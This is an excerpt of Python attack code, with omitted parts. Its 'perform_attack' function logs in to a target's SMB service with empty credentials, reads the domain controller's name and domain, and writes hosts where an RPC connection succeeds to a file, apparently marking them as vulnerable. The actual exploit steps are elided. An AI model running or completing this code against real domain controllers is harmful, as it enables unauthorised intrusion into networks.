...
def perform_attack(options):
  ...
  rpc_con = None
  conn = SMBConnection(options.target, options.target, None, options.port,timeout=timeout)
  conn.login('','')
  dc_handle = f"\\\\{conn.getServerName()}"
  target_computer = conn.getServerName()
  d = conn.getServerDomain()
  dc_ip = options.target  
  oops = d+'/'+target_computer+'\$@'+dc_ip
  print(oops)
  ...
  if rpc_con:
    ...
    with open('good.txt', 'a+') as f:
        f.write(d+'/'+target_computer+'\$@'+dc_ip+'\n')
